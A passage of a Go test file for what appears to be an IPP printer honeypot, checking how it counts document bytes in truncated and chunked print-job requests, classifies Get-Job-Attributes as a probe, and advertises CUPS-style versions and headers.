		h := startIPP(t)
		body := ippBody(ippOpPrintJob, 1, "j", nil)
		ippRaw(t, h.addr, ippHead(strconv.Itoa(len(body))), body)
		ev := waitAttack(t, h.sink)
		if ev.Meta["document_bytes"] != "0" {
			t.Errorf("document_bytes = %q, want 0", ev.Meta["document_bytes"])
		}
		if strings.Contains(h.logs.String(), `"payload_type":"ipp_document"`) {
			t.Error("a request without a document logged a document payload")
		}
	})
	t.Run("end tag is the last byte of a cut body", func(t *testing.T) {
		t.Parallel()
		h := startIPP(t)
		const extra = 5000
		body := ippPadded(ippOpPrintJob, maxHTTPBody, nil)
		if len(body) != maxHTTPBody {
			t.Fatalf("body of %d bytes", len(body))
		}
		ippRaw(t, h.addr, ippHead(strconv.Itoa(maxHTTPBody+extra)), body, bytes.Repeat([]byte("D"), extra))
		ev := waitAttack(t, h.sink)
		if ev.Meta["document_bytes"] != strconv.Itoa(extra) {
			t.Errorf("document_bytes = %q, want %d", ev.Meta["document_bytes"], extra)
		}
	})
	t.Run("attribute bytes of a cut body are not document bytes", func(t *testing.T) {
		t.Parallel()
		h := startIPP(t)
		// More than ippMaxAttrs attributes and no end tag within the read part.
		b := []byte{2, 0, 0, 2, 0, 0, 0, 1, ippTagOperationAttrs}
		w := &ippWriter{}
		for range 120 {
			w.str(0x41, "x", strings.Repeat("a", 200))
		}
		b = append(append(b, w.b...), ippTagEnd)
		b = append(b, bytes.Repeat([]byte("D"), 100)...)
		if len(b) < maxHTTPBody+1000 {
			t.Fatalf("body of %d bytes is too short", len(b))
		}
		ippRaw(t, h.addr, ippHead(strconv.Itoa(len(b))), b)
		ev := waitAttack(t, h.sink)
		if ev.Meta["kind"] != ippKindPrintJob || ev.Meta["document_bytes"] != "0" {
			t.Errorf("meta = %v, want print_job with 0 document bytes", ev.Meta)
		}
	})
	t.Run("chunked bodies are understated", func(t *testing.T) {
		t.Parallel()
		h := startIPP(t)
		body := ippBody(ippOpPrintJob, 1, "", bytes.Repeat([]byte("D"), 20000))
		offset := len(ippBody(ippOpPrintJob, 1, "", nil))
		head := []byte("POST /ipp/print HTTP/1.1\r\nHost: x\r\nContent-Type: application/ipp\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n")
		ippRaw(t, h.addr, head, []byte(strconv.FormatInt(int64(len(body)), 16)+"\r\n"), body, []byte("\r\n0\r\n\r\n"))
		ev := waitAttack(t, h.sink)
		// Only the bytes read before the cut are counted: no declared length exists.
		if want := strconv.Itoa(maxHTTPBody - offset); ev.Meta["document_bytes"] != want {
			t.Errorf("document_bytes = %q, want %s", ev.Meta["document_bytes"], want)
		}
	})
}

func TestIPPGetJobAttributesIsProbe(t *testing.T) {
	t.Parallel()
	h := startIPP(t)
	res := ippPost(t, h, "/ipp/print", ippBody(ippOpGetJobAttributes, 5, "", nil), nil)
	if st := ippStatus(t, res); st != ippStatusNotFound {
		t.Errorf("status = 0x%04x, want not-found", st)
	}
	if ev := h.waitClass(t, false); ev.Class != alert.ClassProbe {
		t.Errorf("class = %s", ev.Class)
	}
	if kind, attack := ippKindOf(ippOpGetJobAttributes); attack || kind != ippKindAttributes {
		t.Errorf("kind = %s attack = %v", kind, attack)
	}
}

func TestIPPAdvertisedVersionsAndUptime(t *testing.T) {
	t.Parallel()
	b := ippPrinterAttrsBytes
	for _, v := range []string{"1.0", "1.1", "2.0", "2.1", "2.2"} {
		if !bytes.Contains(b, []byte{0, 3, v[0], '.', v[2]}) {
			t.Errorf("version %s not advertised", v)
		}
	}
	up := append(append([]byte{0x21, 0, 15}, "printer-up-time"...), 0, 4)
	up = binary.BigEndian.AppendUint32(up, ippPrinterUpTime)
	if !bytes.Contains(b, up) {
		t.Error("printer-up-time missing")
	}
	if !strings.Contains(ippServerHeader, "CUPS/2.4") {
		t.Errorf("server header = %q", ippServerHeader)
	}
}
